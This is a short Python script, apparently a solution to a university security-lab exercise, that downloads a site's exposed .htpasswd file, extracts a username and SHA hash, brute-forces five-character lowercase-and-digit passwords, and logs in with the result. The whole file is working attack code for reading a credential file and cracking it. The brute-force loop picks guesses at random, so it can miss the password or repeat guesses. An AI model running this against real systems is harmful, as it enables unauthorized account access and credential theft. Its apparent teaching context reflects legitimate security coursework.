import secrets
import string
import requests
import re
import htpasswdlib

url = "https://t19.itsec.sec.in.tum.de/"

s = requests.Session()
# Extract the SHA Hashes and then test every password if the hash is the same
# password = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(5))
# Only lowercase and numbers
resp = s.get(url + "/.htpasswd")
print(resp.text)
pattern = r'(\w+):{SHA}(\S+)'

match = re.search(pattern, resp.text)
user = match.group(1)
print(user)
hash_SHA = match.group(2)
print(hash_SHA)
final_pass = ""
for i in range(60_466_176):
    #Bruteforce mögliche Passwörter  -> Hashe sie -> gleicher Hash break
    password = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(5))
    if htpasswdlib.sha1_hash(user, password) == hash_SHA:
        final_pass = password
        break
    if i == 1_000_000:
        print("One Million")

r = s.post(url, data={"username": user, "password": final_pass})
print(r.text)

